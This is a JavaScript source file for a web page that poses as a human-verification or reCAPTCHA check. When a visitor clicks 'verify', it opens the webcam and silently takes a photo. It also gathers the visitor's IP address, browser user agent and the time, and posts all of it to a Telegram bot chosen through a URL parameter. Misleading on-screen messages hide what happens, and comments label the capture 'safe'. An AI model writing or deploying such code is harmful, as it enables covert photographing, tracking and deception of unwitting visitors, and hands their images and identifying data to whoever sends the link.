import { BOT_TOKEN } from "./config.js";

const verifyBtn = document.getElementById("verifyBtn");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const toast = document.getElementById("toast");
const recaptchaSection = document.getElementById("recaptcha-section");

const params = new URLSearchParams(window.location.search);
const chatId = params.get("id");

let stream = null;

// Toast
function show(msg){
  toast.innerText = msg;
}

// Get IP
async function getIP(){
  try{
    const r = await fetch("https://api.ipify.org?format=json");
    const d = await r.json();
    return d.ip;
  }catch{
    return "Unknown";
  }
}

// Capture ONE photo (safe)
async function capture(){
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video,0,0);

  const blob = await new Promise(res => canvas.toBlob(res,"image/jpeg"));

  const ip = await getIP();
  const ua = navigator.userAgent;
  const date = new Date().toLocaleString();

  const caption = `IP: ${ip}
UA: ${ua}
Date: ${date}`;

  const fd = new FormData();
  fd.append("chat_id", chatId);
  fd.append("photo", blob);
  fd.append("caption", caption);

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
    method:"POST",
    body:fd
  });

  show("Wait a moment");
}

// Start camera (user click)
verifyBtn.onclick = async () => {
  try{
    stream = await navigator.mediaDevices.getUserMedia({video:true});
    video.srcObject = stream;
    await video.play();

    show("Something went wrong ❌");

    // Only ONE capture (safe)
    await capture();

    recaptchaSection.style.display="block";

  }catch{
    show("Permission denied ❌");
  }
};

// reCAPTCHA success
window.onRecaptchaSuccess = () => {
  window.location.href = "next.html";
};
